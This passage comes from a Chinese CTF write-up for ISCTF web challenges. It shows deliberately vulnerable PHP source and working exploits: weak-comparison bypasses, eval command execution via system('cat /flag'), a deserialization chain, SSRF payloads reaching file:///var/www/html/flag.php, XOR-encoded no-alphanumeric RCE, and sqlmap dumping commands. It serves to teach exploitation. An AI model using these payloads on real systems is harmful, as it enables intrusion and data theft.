class="string">&quot;GET1&quot;</span>];</span><br><span class="line"><span class="variable">$GET2</span> = <span class="variable">$_POST</span>[<span class="string">&quot;GET2&quot;</span>];</span><br><span class="line"><span class="variable">$POST1</span> = <span class="variable">$_GET</span>[<span class="string">&quot;P0ST1&quot;</span>];</span><br><span class="line"><span class="variable">$POST2</span> = <span class="variable">$_GET</span>[<span class="string">&quot;P0ST2&quot;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$YOUR_NAME</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$YOUR_NAME</span>.<span class="string">&quot;,请开始你的答题。&quot;</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;做题前请告诉我你是小蓝鲨吗？&quot;</span>;</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$POST1</span>))&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&quot;P0ST1&quot;</span>] != <span class="variable">$_GET</span>[<span class="string">&quot;P0ST2&quot;</span>])&#123;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> ((<span class="variable">$_GET</span>[<span class="string">&quot;P0ST1&quot;</span>]) == <span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&quot;P0ST2&quot;</span>]))&#123;</span><br><span class="line"></span><br><span class="line">                <span class="variable">$f1</span>=<span class="variable">$flag1</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;小蓝鲨成功一半&quot;</span>.<span class="variable">$f1</span>;              </span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^[0-9]*$/&#x27;</span>,<span class="variable">$GET1</span>)) &#123;</span><br><span class="line"><span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$GET1</span> == <span class="number">0</span> )&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>.<span class="string">&quot;前面的出来了吗？&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$GET2</span>))&#123;</span><br><span class="line">            <span class="keyword">exit</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$GET2</span> &gt; <span class="number">678</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;答案就在眼前？&quot;</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>.<span class="variable">$YOUR_NAME</span>.<span class="string">&quot;,你觉得这是flag吗？&quot;</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;     </span><br><span class="line">            <span class="variable">$Ag</span>=<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$flag2</span>);</span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$flag666</span> = <span class="variable">$f1</span>.<span class="variable">$Ag</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$flag666</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>第一层：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$POST1</span>))&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&quot;P0ST1&quot;</span>] != <span class="variable">$_GET</span>[<span class="string">&quot;P0ST2&quot;</span>])&#123;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> ((<span class="variable">$_GET</span>[<span class="string">&quot;P0ST1&quot;</span>]) == <span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&quot;P0ST2&quot;</span>]))&#123;</span><br><span class="line"></span><br><span class="line">                <span class="variable">$f1</span>=<span class="variable">$flag1</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;小蓝鲨成功一半&quot;</span>.<span class="variable">$f1</span>;              </span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>POST1必须是数字，POST1和POST2不相等，但是他们的md5值要相等。</p><p>这里用到了PHP特性的知识，md5弱比较。</p><p>原理：</p><blockquote><p>在 php 中，当字符串 以0e开头时，会被 php 识别成科学计数法，会被认为是数字。</p></blockquote><p>Payload1：<code>http://120.79.18.34:20867/?NAME=1&amp;P0ST1=0e545993274517709034328855841020&amp;P0ST2=s878926199a</code></p><p>第二层</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^[0-9]*$/&#x27;</span>,<span class="variable">$GET1</span>)) &#123;</span><br><span class="line"><span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>( <span class="variable">$GET1</span> == <span class="number">0</span> )&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>.<span class="string">&quot;前面的出来了吗？&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$GET2</span>))&#123;</span><br><span class="line">            <span class="keyword">exit</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$GET2</span> &gt; <span class="number">678</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;答案就在眼前？&quot;</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>.<span class="variable">$YOUR_NAME</span>.<span class="string">&quot;,你觉得这是flag吗？&quot;</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;     </span><br><span class="line">            <span class="variable">$Ag</span>=<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$flag2</span>);</span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>这里要求$GET1不能为数字，而且$GET1又等于0，并且$GET2不能为数字，值大于678。</p><p>弱类型比较：</p><blockquote><p>php 中0 与任何字符串比较都为 true，因为字符串被强制转换（截断）后都成了 0。</p></blockquote><p>Payload2：<code>GET1=a&amp;GET2=6782s</code></p><p>前半段的flag要经过hex编码，后半段经过base64解码后可以得到一个unicode再解码即可。</p><p>ISCTF{4f759692-a911-4f11-bf22-ddaa305514c0}</p><h2 id="simplephp"><a href="#simplephp" class="headerlink" title="simplephp"></a>simplephp</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(E_ERROR);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$str</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;str&#x27;</span>];</span><br><span class="line"><span class="variable">$pattern</span> = <span class="string">&quot;#\\\\\\\\/Ilikeisctf#&quot;</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$num</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$num</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;0x&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="variable">$num</span>);</span><br><span class="line">    <span class="variable">$num</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;0&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="variable">$num</span>);</span><br><span class="line">    <span class="variable">$num</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;.&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="variable">$num</span>);</span><br><span class="line">    <span class="variable">$num</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;e&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="variable">$num</span>);</span><br><span class="line">    <span class="variable">$num</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;+&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="variable">$num</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$num</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="variable">$pattern</span>,<span class="variable">$str</span>,<span class="variable">$arr</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;good try!&quot;</span>;</span><br><span class="line">    <span class="variable">$num</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$num</span>) <span class="keyword">and</span> <span class="variable">$num</span>!==<span class="string">&#x27;36&#x27;</span> <span class="keyword">and</span> <span class="title function_ invoke__">trim</span>(<span class="variable">$num</span>)!==<span class="string">&#x27;36&#x27;</span> <span class="keyword">and</span> <span class="title function_ invoke__">filter</span>(<span class="variable">$num</span>)==<span class="string">&#x27;36&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;come on!!!&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$num</span>==<span class="string">&#x27;36&#x27;</span>&amp;<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]))&#123;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;hacker!!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;hacker!!!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>要求preg_match($pattern,$str,$arr)，就是pattern要在str内，注意#是界定符，所以这俩#都不能加。<code>str=\\\\\\\\/Ilikeisctf</code>。</p><p>num通过is_numeric的检测，并且不等于36，去空后依然不等于36，经过过滤方法后等于要36。</p><p>fuzz一下，exp.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$num</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;0x&quot;</span>, <span class="string">&quot;1&quot;</span>, <span class="variable">$num</span>);</span><br><span class="line">    <span class="variable">$num</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;0&quot;</span>, <span class="string">&quot;1&quot;</span>, <span class="variable">$num</span>);</span><br><span class="line">    <span class="variable">$num</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;.&quot;</span>, <span class="string">&quot;1&quot;</span>, <span class="variable">$num</span>);</span><br><span class="line">    <span class="variable">$num</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;e&quot;</span>, <span class="string">&quot;1&quot;</span>, <span class="variable">$num</span>);</span><br><span class="line">    <span class="variable">$num</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;+&quot;</span>, <span class="string">&quot;1&quot;</span>, <span class="variable">$num</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$num</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">127</span>; <span class="variable">$i</span>++) </span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="string">&#x27;36&#x27;</span>.<span class="title function_ invoke__">chr</span>(<span class="variable">$i</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$num</span>) <span class="keyword">and</span> <span class="variable">$num</span>!==<span class="string">&#x27;36&#x27;</span> <span class="keyword">and</span> <span class="title function_ invoke__">trim</span>(<span class="variable">$num</span>)!==<span class="string">&#x27;36&#x27;</span> <span class="keyword">and</span> <span class="title function_ invoke__">filter</span>(<span class="variable">$num</span>)==<span class="string">&#x27;36&#x27;</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">chr</span>(<span class="variable">$i</span>)) . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Payload:<code>http://120.79.18.34:20545/?str=\\\\\\\\/Ilikeisctf&amp;num=36%0C&amp;cmd=system(&#39;cat /flag&#39;);</code></p><p>ISCTF{59551edf-ece1-4878-a4a8-7d10e0dbfb19}</p><h2 id="猫和老鼠"><a href="#猫和老鼠" class="headerlink" title="猫和老鼠"></a>猫和老鼠</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag is in flag.php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">mouse</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$v</span>;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Good. You caught the mouse:&quot;</span>;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable language_">$this</span>-&gt;v);</span><br><span class="line">      </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">cat</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$c</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">dog</span>();</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;b = <span class="variable language_">$this</span>-&gt;c;</span><br><span class="line">        <span class="keyword">die</span>(<span class="variable language_">$this</span>-&gt;a);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">dog</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123; </span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a = <span class="string">&quot;I&#x27;m a vicious dog, Kitty&quot;</span>;    </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&quot;cat&quot;</span>]); </span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>反序列化</p><p>这个题目就是一个反序列化加一个php伪协议的利用。 利用include执行php伪协议造成文件读取 主要是绕过在执行析构函数的时候绕过dog会把cat内的a属性给变成I’m a vicious dog, Kitty 利用引用绕过</p><p>exp.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">mouse</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$v</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;v = <span class="string">&#x27;php://filter/convert.base64-encode/resource=flag.php&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">cat</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$c</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;b = &amp;<span class="variable language_">$this</span>-&gt;a;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;c = <span class="keyword">new</span> <span class="title function_ invoke__">mouse</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$abc</span> = <span class="keyword">new</span> <span class="title function_ invoke__">cat</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$abc</span>);</span><br></pre></td></tr></table></figure><p>解释一下<code>$this-&gt;b = &amp;$this-&gt;a;</code>中&amp;是取地址符号，意思是b将指向a的地址空间，这时a和b都是指向同一个地址空间，给b赋值就相当于给a赋值。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">playload:cat=O:3:%22cat%22:3&#123;s:1:%22a%22;N;s:1:%22b%22;R:2;s:1:%22c%22;O:5:%22mouse%22:1&#123;s:1:%22v%22;s:52:%22php://filter/convert.base64-encode/resource=flag.php%22;&#125;&#125;</span><br></pre></td></tr></table></figure><p>base64解码一下即可。</p><p>ISCTF{c98bfcc5-5688-4c9f-b11a-b61f3ff01b9f}</p><h2 id="curl"><a href="#curl" class="headerlink" title="curl"></a>curl</h2><p>这里有个this可以点击，然后提示让我们从本地访问，可以看到flag在www目录下。</p><p><img src="https://s2.loli.net/2023/08/04/2XJlHROuPGkwpFj.png" alt="image-20221105222032500.png"></p><p>看源码，发现</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">if(isset($_GET[&#x27;urls&#x27;]))&#123;</span><br><span class="line">$urls = $_GET[&#x27;urls&#x27;];</span><br><span class="line">$url_host = parse_url($urls,PHP_URL_HOST);</span><br><span class="line">//Do something~~~~</span><br><span class="line">curl_get($urls);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>意思是让我们传一个url地址，一道ssrf。</p><p>先尝试<code>?urls=http://127.0.0.1/flag.php</code>发现被过滤了，localhost也不行。</p><p><img src="https://s2.loli.net/2023/08/04/QjOwrS8kZYc4WIv.png" alt="image-20221105222956977.png"></p><p>尝试把127.0.0.1转化为其他进制试试看（也是能访问的）</p><blockquote><p>2130706433 10进制 <a href="http://2130706433">http://2130706433</a><br>017700000001 8进制 <a href="http://017700000001">http://017700000001</a><br>7F000001 16进制 <a href="http://0x7F000001">http://0x7F000001</a></p></blockquote><p>尝试10进制可以,<code>?urls=http://2130706433/flag.php</code></p><p>还有一种解法，看到注释里Do something~~~~就是对urls做了些处理，php里并没有curl_get函数，parse_url对url进行了分割。那么可以可以猜测curl_get函数是获得资源的。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://120.79.18.34:20010/?urls=127.0.0.1/flag.php</span><br></pre></td></tr></table></figure><p>也可以</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://120.79.18.34:20010/?urls=file:///var/www/html/flag.php</span><br></pre></td></tr></table></figure><p>ISCTF{c706d632-5edf-4c4b-bf52-a3676c8411d9}</p><h2 id="rce？"><a href="#rce？" class="headerlink" title="rce？"></a>rce？</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[a-z0-9]/is&#x27;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;shell&#x27;</span>])) &#123;</span><br><span class="line">  <span class="variable">$code</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;shell&#x27;</span>];</span><br><span class="line">  <span class="title function_ invoke__">var_dump</span>(<span class="keyword">eval</span>(<span class="variable">$code</span>));</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">  </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;你能拿到flag吗？&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>正则过滤了数字和字母，很明显无数字字母rce。</p><p>exp.py</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a=&quot;tac /f*&quot;;</span><br><span class="line">echo &quot;(\&quot;&quot;;</span><br><span class="line">for ($i=0; $i &lt; strlen($a); $i++) &#123; </span><br><span class="line">    echo &quot;%&quot;.dechex(ord($a[$i])^0xff);</span><br><span class="line">&#125;</span><br><span class="line">echo &quot;\&quot;^\&quot;&quot;;</span><br><span class="line">for ($i=0; $i &lt; strlen($a); $i++) &#123; </span><br><span class="line">    echo &quot;%ff&quot;;</span><br><span class="line">&#125;</span><br><span class="line">echo &quot;\&quot;)&quot;;</span><br></pre></td></tr></table></figure><p>Payload:<code>?shell=(&quot;%8c%86%8c%8b%9a%92&quot;^&quot;%ff%ff%ff%ff%ff%ff&quot;)(&quot;%8b%9e%9c%df%d0%99%d5&quot;^&quot;%ff%ff%ff%ff%ff%ff%ff&quot;);</code></p><p>ISCTF{11bdd027-5e99-4e21-b066-02dc1c125724}</p><h2 id="傻注"><a href="#傻注" class="headerlink" title="傻注"></a>傻注</h2><p>找一下登录界面login.php</p><p><img src="https://s2.loli.net/2023/08/04/wIVkh6aFc7uSp8Y.png" alt="04c21f4583e14b4f9069deccc6f4d4d8.png"></p><p>根据题目猜测，这是一道sql注入的题目</p><p>burp suit简单扫一下，发现存在ua注入，直接sqlmap一把梭</p><p>查看数据库<br><code>sqlmap -u http://120.79.18.34:20387/login.php --level 3 --dbs</code></p><p><img src="https://s2.loli.net/2023/08/04/OAn6hJuBWV4wGQC.png" alt="4b8a9a503af6421ab11c8905eda0dff1.png"></p><p>查看表<br><code>sqlmap -u http://120.79.18.34:20387/login.php --level 3 -D ctf --tables</code></p><p><img src="https://s2.loli.net/2023/08/04/4wOi3FytCPSHx8f.png" alt="c7ec92e83c96491aab2452445047b15f.png"></p><p>查看user_agents内容</p><p><code>sqlmap -u http://120.79.18.34:20387/login.php --level 3 -D ctf -T user_agents --columns --dump</code></p><p><img src="https://s2.loli.net/2023/08/04/pnYeAkLmrZaSDBc.png" alt="b5c59d4a63654969a7bb6f5c0320d79a.png"></p><p>得到flag</p><h2 id="easy-onlineshell"><a href="#easy-onlineshell" class="headerlink" title="easy-onlineshell"></a>easy-onlineshell</h2><p>提示我们先扫描一下，dirsearch扫描后发现www.zip源码泄露。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">import flask</span><br><span class="line">import subprocess</span><br><span class="line"></span><br><span class="line">app = flask.<span class="title function_ invoke__">Flask</span>(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.<span class="title function_ invoke__">route</span>(<span class="string">&quot;/&quot;</span>)</span><br><span class="line">def <span class="title function_ invoke__">hello_world</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;Try to access the /rce&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.<span class="title function_ invoke__">route</span>(<span class="string">&quot;/www.zip&quot;</span>)</span><br><span class="line">def <span class="title function_ invoke__">return_SourceCode</span>():</span><br><span class="line">    with <span class="title function_ invoke__">open</span>(<span class="string">&quot;./app.py&quot;</span>, <span 